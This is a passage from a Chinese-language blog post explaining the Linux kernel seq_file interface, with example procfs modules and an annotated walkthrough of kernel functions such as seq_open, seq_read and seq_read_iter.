class="hljs-string">&quot;arttnba3&quot;</span>,<br>    .age    = <span class="hljs-number">23</span>,<br>    .money  = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] name: %s\n&quot;</span>, a3_info.name);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] age: %ld\n&quot;</span>, a3_info.age);<br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] money: %ld\n&quot;</span>, a3_info.money);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *i, <span class="hljs-keyword">struct</span> file *f)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> single_open(f, a3kmod_seq_show, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_ops</span> <span class="hljs-title">a3kmod_ops</span> =</span> &#123;<br>    .proc_open      = a3kmod_open,<br>    .proc_read      = seq_read,<br>    .proc_lseek     = seq_lseek,<br>    .proc_release   = seq_release,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!proc_create(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>测试一下：</p><p><img src="https://s2.loli.net/2024/06/03/BMN2iSZJVb3kwht.png"></p><h2 id="序列文件接口开发：proc-seq-接口"><a href="#序列文件接口开发：proc-seq-接口" class="headerlink" title="序列文件接口开发：proc_seq 接口"></a>序列文件接口开发：proc_seq 接口</h2><p>proc_seq 接口同时提供了创建 procfs 节点与初始化 seq_file 的功能，我们只需要调用 <code>proc_create_seq()</code> 便能创建 procfs + 初始化 seq_file 一步到位，底层而言不同的是其帮我们实现的是 <code>read_iter</code> 接口而非 <code>read()</code> 接口，这意味着 <em>这样的序列文件可以从内核侧被读取</em></p><p>下面是对上面的链表读取的例子进行简单重写的例子：</p><blockquote><p>其实也没有简化太多…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/proc_fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/seq_file.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x100</span>];<br>&#125;;<br><br>LIST_HEAD(a3_seq_list);<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_start</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span>;</span><br>    <span class="hljs-type">loff_t</span> cpos = <span class="hljs-number">0</span>;<br><br>    list_for_each_entry(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        <span class="hljs-keyword">if</span> (cpos == (*ppos)) &#123;<br>            <span class="hljs-keyword">return</span> ptr;<br>        &#125;<br><br>        cpos++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">a3kmod_seq_next</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">ptr</span> =</span> v;<br><br>    (*ppos)++;<br><br>    ptr = list_next_entry(ptr, <span class="hljs-built_in">list</span>);<br>    <span class="hljs-keyword">if</span> (unlikely(list_entry_is_head(ptr, &amp;a3_seq_list, <span class="hljs-built_in">list</span>))) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_seq_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span> =</span> v;<br><br>    seq_printf(m, <span class="hljs-string">&quot;[a3kmod_data] data: %s\n&quot;</span>, data-&gt;data);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_seq_stop</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br>    <span class="hljs-comment">/* do nothing */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> <span class="hljs-title">a3kmod_seq_ops</span> =</span> &#123;<br>    .start  = a3kmod_seq_start,<br>    .show   = a3kmod_seq_show,<br>    .next   = a3kmod_seq_next,<br>    .stop   = a3kmod_seq_stop,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_release_data_list</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">cur</span>, *<span class="hljs-title">next</span>;</span><br><br>    list_for_each_entry_safe(cur, next, &amp;a3_seq_list, <span class="hljs-built_in">list</span>) &#123;<br>        list_del(&amp;cur-&gt;<span class="hljs-built_in">list</span>);<br>        kfree(cur);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">a3_seq_data</span> *<span class="hljs-title">data</span>;</span><br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++) &#123;<br>        data = kmalloc(<span class="hljs-keyword">sizeof</span>(*data), GFP_KERNEL);<br>        <span class="hljs-keyword">if</span> (!data) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to alloc data!\n&quot;</span>);<br>            a3kmod_release_data_list();<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">sprintf</span>(data-&gt;data, <span class="hljs-string">&quot;arttnba3 - no.%.2d data&quot;</span>, i);<br>        list_add_tail(&amp;data-&gt;<span class="hljs-built_in">list</span>, &amp;a3_seq_list);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!proc_create_seq(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-number">0666</span>, <span class="hljs-literal">NULL</span>, &amp;a3kmod_seq_ops)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>简单测试：</p><p><img src="https://s2.loli.net/2024/06/03/liUg9bKBcz1QqGV.png"></p><h1 id="0x02-序列文件接口-实现原理"><a href="#0x02-序列文件接口-实现原理" class="headerlink" title="0x02. 序列文件接口 - 实现原理"></a>0x02. 序列文件接口 - 实现原理</h1><p>序列文件接口的实现其实可以理解成在 VFS 上套了一层通用 wrapper，整体上还是比较简单的，本节我们从 VFS 文件接口的调用路径来看序列文件接口是如何实现的</p><h2 id="seq-open-：-序列文件初始化"><a href="#seq-open-：-序列文件初始化" class="headerlink" title="seq_open() ： 序列文件初始化"></a>seq_open() ： 序列文件初始化</h2><p>使用序列文件接口需要在自定义的 <code>read()</code> 函数中调用 <code>seq_open()</code> 进行初始化，这个函数的作用其实就是分配一个 <code>seq_file</code> 结构体存放到 <code>file::private</code> 中，并去除文件属性 <code>file::f_mode</code> 中的 <code>FMODE_PWRITE</code> 位（即文件变得不可被使用 <code>pwrite()</code> 访问，因为这个函数不会改变文件偏移，对序列文件接口而言增加了操作复杂性）</p><p>不过比起简约的函数本身，注释则详细地对序列文件接口进行了说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_open -初始化序列文件</span><br><span class="hljs-comment"> *@file: 我们要初始化的文件</span><br><span class="hljs-comment"> *@op: 描述序列的方法表</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *seq_open() 设置了 @file, 将其与一个由 @op 描述的序列进行关联。</span><br><span class="hljs-comment"> *@op-&gt;start() 启动了迭代器并返回序列的第一个元素。</span><br><span class="hljs-comment"> *@op-&gt;stop() 将其停止。  </span><br><span class="hljs-comment"> *@op-&gt;next() 返回序列的下一个元素。</span><br><span class="hljs-comment"> *@op-&gt;show() 将元素打印到缓冲区中。</span><br><span class="hljs-comment"> *在出错的情况下 -&gt;start() 与 -&gt;next() 返回 ERR_PTR(error)，</span><br><span class="hljs-comment"> *  在序列到达末尾时返回 NULL。</span><br><span class="hljs-comment"> *-&gt;show() 在成功时返回 0,在出错时返回一个负数值，</span><br><span class="hljs-comment"> *  返回 SEQ_SKIP 表示 &quot;丢弃这个元素并继续移动&quot;。</span><br><span class="hljs-comment"> *注意: seq_open() 会分配一个 struct seq_file 并将其指针</span><br><span class="hljs-comment"> *存放在 @file-&gt;private_data，这个指针不应当被修改。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *op)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">p</span>;</span><br><br>WARN_ON(file-&gt;private_data);<br><br>p = kmem_cache_zalloc(seq_file_cache, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!p)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>file-&gt;private_data = p;<br><br>mutex_init(&amp;p-&gt;lock);<br>p-&gt;op = op;<br><br><span class="hljs-comment">// 没有引用计数: &#x27;p&#x27; 的生命周期被约束到文件的生命周期</span><br>p-&gt;file = file;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seq_files 支持 lseek() 与 pread()，且一点也不支持 write()，</span><br><span class="hljs-comment"> * 但我们因为一些历史原因在这清除 FMODE_PWRITE here 位。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若一个 seq_files 的使用者：</span><br><span class="hljs-comment"> * a) 实现了 file.write() 且 b) 想要支持 pwrite()</span><br><span class="hljs-comment"> * 使用者需要在自己的 file.open() 中在调用 seq_open() 后再设置 FMODE_PWRITE。</span><br><span class="hljs-comment"> */</span><br>file-&gt;f_mode &amp;= ~FMODE_PWRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_open);<br></code></pre></td></tr></table></figure><p>这个函数有一个更常用的 wrapper 叫 <code>__seq_open_private()</code> ，主要就是帮开发者多 kmalloc() 一个内存对象放到 <code>seq_file::private</code> 中，这里不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__seq_open_private(<span class="hljs-keyword">struct</span> file *f, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *ops,<br><span class="hljs-type">int</span> psize)<br>&#123;<br><span class="hljs-type">int</span> rc;<br><span class="hljs-type">void</span> *private;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span>;</span><br><br>private = kzalloc(psize, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (private == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>rc = seq_open(f, ops);<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free;<br><br>seq = f-&gt;private_data;<br>seq-&gt;private = private;<br><span class="hljs-keyword">return</span> private;<br><br>out_free:<br>kfree(private);<br>out:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>EXPORT_SYMBOL(__seq_open_private);<br></code></pre></td></tr></table></figure><h2 id="（⭐核心）seq-read-：读取序列文件"><a href="#（⭐核心）seq-read-：读取序列文件" class="headerlink" title="（⭐核心）seq_read() ：读取序列文件"></a>（⭐核心）seq_read() ：读取序列文件</h2><p><code>seq_read()</code> 是正常 VFS 路径上 <code>read()</code> 会调用的函数，因为对于序列文件接口而言我们将函数表中的函数指针指定为该函数，不过这个函数主要是对 <code>seq_read_iter()</code> 的包装，在调用之前简单初始化了写入目标记录 <code>iovec</code> 与操作记录块 <code>kiocb</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_read -序列文件的 -&gt;read() 方法.</span><br><span class="hljs-comment"> *@file: 要读取的源文件</span><br><span class="hljs-comment"> *@buf: 要读入的目标缓冲区</span><br><span class="hljs-comment"> *@size: 最大读取字节</span><br><span class="hljs-comment"> *@ppos: 当前文件位置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;read()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> &#123; .iov_base = buf, .iov_len = size&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br><span class="hljs-type">ssize_t</span> ret;<br><br>init_sync_kiocb(&amp;kiocb, file);<br>iov_iter_init(&amp;iter, ITER_DEST, &amp;iov, <span class="hljs-number">1</span>, size);<br><br>kiocb.ki_pos = *ppos;<br>ret = seq_read_iter(&amp;kiocb, &amp;iter);<br>*ppos = kiocb.ki_pos;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(seq_read);<br></code></pre></td></tr></table></figure><blockquote><p> 什么，你还不知道 iovec、 kiocb、iov_iter 是什么东西？简单来说就是在内核 IO 中用于存放操作信息的数据结构，前者是基础结构，后两者主要配对用于异步 IO：</p><ul><li>iovec：<code>io vector</code>，表示一块带长度的缓冲区</li><li>kiocb：<code>kernel i/o call back</code> ，记录文件侧 IO 信息，包括文件指针、当前偏移等</li><li>iov_iter ：<code>iovec iterator</code> ，用来操作 iovec 的迭代器，记录内存侧 IO 信息，包括内存地址、当前偏移等</li></ul></blockquote><p>下面我们来到序列文件读取的核心函数 <code>seq_read_iter()</code> ，首先会检查文件侧偏移，若是 0 则将序列文件的序列对象偏移与读取字节数也都设为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ready-made -&gt;f_op-&gt;read_iter()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br><span class="hljs-type">size_t</span> copied = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> n;<br><span class="hljs-type">void</span> *p;<br><span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(iter))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>mutex_lock(&amp;m-&gt;lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * if request is to read from zero offset, reset iterator to first</span><br><span class="hljs-comment"> * record as it might have been already advanced by previous requests</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (iocb-&gt;ki_pos == <span class="hljs-number">0</span>) &#123;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>若是文件侧偏移与序列文件读取偏移不等则调用 <code>traverse()</code> 函数处理，如果出错直接跳到 <code>Done</code> 进行收尾，否则将序列文件偏移与文件偏移进行同步：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Don&#x27;t assume ki_pos is where we left it */</span><br><span class="hljs-keyword">if</span> (unlikely(iocb-&gt;ki_pos != m-&gt;read_pos)) &#123;<br><span class="hljs-keyword">while</span> ((err = traverse(m, iocb-&gt;ki_pos)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-comment">/* With prejudice... */</span><br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = iocb-&gt;ki_pos;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>traverse()</code> 函数有点类似一个小的 <code>seq_read_iter()</code> 的核心，作用其实是 <strong>将序列文件的偏移同步到指定的偏移值</strong> ，这里是<strong>同步到文件侧记录的偏移</strong> ：</p><ul><li>初始化从第一个序列数据对象开始读取，检查序列文件的临时缓冲区是否分配</li><li>调用 <code>op-&gt;start()</code> 初始化后进入读取循环：<ul><li>首先调用 <code>op-&gt;show()</code> 打印到临时缓冲区上</li><li>调用 <code>seq_has_overflowed()</code> 检查临时缓冲区是否读满，满则跳到 <code>Eoverflow</code> 标签重新分配一块更大的内存，需要注意的是 <code>traverse()</code> 的作用主要是进行正式读取前的偏移同步，因此不会保存前面读取的数据</li><li>调用 <code>op-&gt;next()</code> 移动到下个序列数据对象，若本次超出预期偏移则减去对应数据量大小并退出循环，注意这里额外用了一个变量 <code>pos</code> 记录读取的数据量，且每次完成读取会清空临时缓冲区读取计数 <code>m-&gt;count</code> 加到 <code>pos</code> 上</li><li>若完成读取到指定偏移的任务则退出循环</li></ul></li><li>调用 <code>op-&gt;stop()</code> 终止读取并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">traverse</span><span 